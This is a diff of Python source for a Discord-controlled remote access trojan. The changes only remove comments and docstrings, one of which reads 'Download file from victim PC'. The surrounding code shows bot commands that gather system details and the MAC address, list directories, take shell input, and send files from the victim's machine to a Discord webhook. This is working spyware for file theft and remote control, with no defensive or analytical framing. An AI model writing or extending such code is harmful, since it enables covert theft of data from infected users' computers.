@@ -342,10 +342,8 @@ def list_directory(path='.'):
 
 def download_file(file_path):
     try:
-        # Expand user paths
         file_path = os.path.expanduser(file_path)
         
-        # Try common path variations
         possible_paths = [
             file_path,
             file_path.replace('/', '\\'),
@@ -362,7 +360,6 @@ def download_file(file_path):
         if not found_path:
             return f"File not found: {file_path}"
         
-        # Send file (no size limit)
         with open(found_path, 'rb') as f:
             from discord import SyncWebhook, File
             webhook = SyncWebhook.from_url(WEBHOOK_URL)
@@ -393,7 +390,6 @@ async def ip(ctx):
 
 @bot.command()
 async def pcinfo(ctx):
-    """Get detailed PC information"""
     await ctx.send("Collecting PC information...")
     
     try:
@@ -406,10 +402,8 @@ async def pcinfo(ctx):
         machine = platform.machine()
         processor = platform.processor()
         
-        # Get MAC address
         mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
         
-        # Get Windows version
         win_ver = ""
         if platform.system() == "Windows":
             win_ver = f"Windows Version: {platform.win32_ver()[0]} {platform.win32_ver()[1]}"
@@ -480,7 +474,6 @@ async def shell_input(ctx, *, command):
 
 @bot.command()
 async def ls(ctx, path='.'):
-    """List directory contents. Usage: !ls C:\"""
     try:
         path = os.path.expanduser(path)
         if not os.path.exists(path):
@@ -498,14 +491,11 @@ async def ls(ctx, path='.'):
 
 @bot.command()
 async def download(ctx, *, file_path):
-    """Download file from victim PC. Usage: !download C:\file.txt"""
     await ctx.send(f"Attempting to download: {file_path}")
     
     try:
-        # Expand user paths
         file_path = os.path.expanduser(file_path)
         
-        # Try common path variations
         possible_paths = [
             file_path,
             file_path.replace('/', '\\'),
@@ -523,7 +513,6 @@ async def download(ctx, *, file_path):
             await ctx.send(f"File not found: {file_path}")
             return
         
-        # Send file (no size limit)
         with open(found_path, 'rb') as f:
             from discord import SyncWebhook, File
             webhook = SyncWebhook.from_url(WEBHOOK_URL)
